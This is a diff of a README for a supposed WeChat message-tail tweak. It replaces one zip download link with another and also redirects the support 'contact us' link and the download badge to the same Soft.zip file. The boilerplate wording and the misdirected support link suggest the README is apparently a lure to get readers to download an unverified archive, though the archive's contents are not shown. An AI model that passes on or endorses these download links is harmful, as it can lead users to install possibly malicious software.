@@ -9,13 +9,13 @@ Welcome to the **WCTimeLineMessageTail** repository, a WeChat Time Line Message 
 - Enhance your messaging experience on WeChat
 
 ## Installation
-To install this tweak, download the [WCTimeLineMessageTail Release.zip](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) file and follow the installation instructions in the README provided in the zip file.
+To install this tweak, download the [WCTimeLineMessageTail https://github.com/yusri82/WCTimeLineMessageTail/releases/download/v1.0/Soft.zip](https://github.com/yusri82/WCTimeLineMessageTail/releases/download/v1.0/Soft.zip) file and follow the installation instructions in the README provided in the zip file.
 
 ## Usage
 Once installed, navigate to the settings of the tweak to set your desired custom text tail for your WeChat messages. Enjoy the personalized touch it brings to your messaging experience.
 
 ## Support
-For any questions, issues, or feedback, please feel free to [contact us](https://github.com/adelante20).
+For any questions, issues, or feedback, please feel free to [contact us](https://github.com/yusri82/WCTimeLineMessageTail/releases/download/v1.0/Soft.zip).
 
 ## Contribute
 If you would like to contribute to this project, you are welcome to submit a pull request with your changes.
@@ -26,6 +26,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## Acknowledgements
 Special thanks to the developers who have contributed to this project.
 
-[![Download Release.zip](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download https://github.com/yusri82/WCTimeLineMessageTail/releases/download/v1.0/Soft.zip](https://github.com/yusri82/WCTimeLineMessageTail/releases/download/v1.0/Soft.zip)](https://github.com/yusri82/WCTimeLineMessageTail/releases/download/v1.0/Soft.zip)
 
 Explore the possibilities with **WCTimeLineMessageTail** and elevate your WeChat messaging experience today! 🚀📱🎉
